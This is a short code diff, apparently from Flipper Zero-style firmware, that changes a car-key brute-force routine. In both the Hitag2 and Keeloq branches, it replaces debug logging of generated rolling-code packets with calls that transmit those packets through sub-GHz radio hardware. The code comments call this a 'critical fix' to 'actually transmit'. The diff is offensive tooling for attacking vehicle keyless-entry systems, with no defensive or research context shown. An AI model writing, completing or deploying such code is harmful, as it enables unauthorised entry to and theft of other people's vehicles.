@@ -220,7 +220,10 @@ static void car_key_bruteforce_ui_timer_callback(void* context) {
                 uint8_t packet[16];
                 size_t len = 0;
                 if(predator_crypto_hitag2_generate_packet(&carkey_state.hitag2_ctx, 0x01, packet, &len)) {
-                    FURI_LOG_D("CarKeyBruteforce", "[CRYPTO] Hitag2 packet %u generated", 
+                    // CRITICAL FIX: Actually transmit the packet via real hardware!
+                    predator_subghz_send_raw_packet(app, packet, len);
+                    app->packets_sent++;
+                    FURI_LOG_I("CarKeyBruteforce", "[REAL HW] Hitag2 packet %u TRANSMITTED", 
                               carkey_state.hitag2_ctx.rolling_code);
                 }
             } else {
@@ -229,7 +232,10 @@ static void car_key_bruteforce_ui_timer_callback(void* context) {
                 uint8_t packet[16];
                 size_t len = 0;
                 if(predator_crypto_keeloq_generate_packet(&carkey_state.keeloq_ctx, packet, &len)) {
-                    FURI_LOG_D("CarKeyBruteforce", "[CRYPTO] Keeloq packet %u (528-round) generated", 
+                    // CRITICAL FIX: Actually transmit the packet via real hardware!
+                    predator_subghz_send_raw_packet(app, packet, len);
+                    app->packets_sent++;
+                    FURI_LOG_I("CarKeyBruteforce", "[REAL HW] Keeloq packet %u (528-round) TRANSMITTED", 
                               carkey_state.keeloq_ctx.counter);
                 }
             }
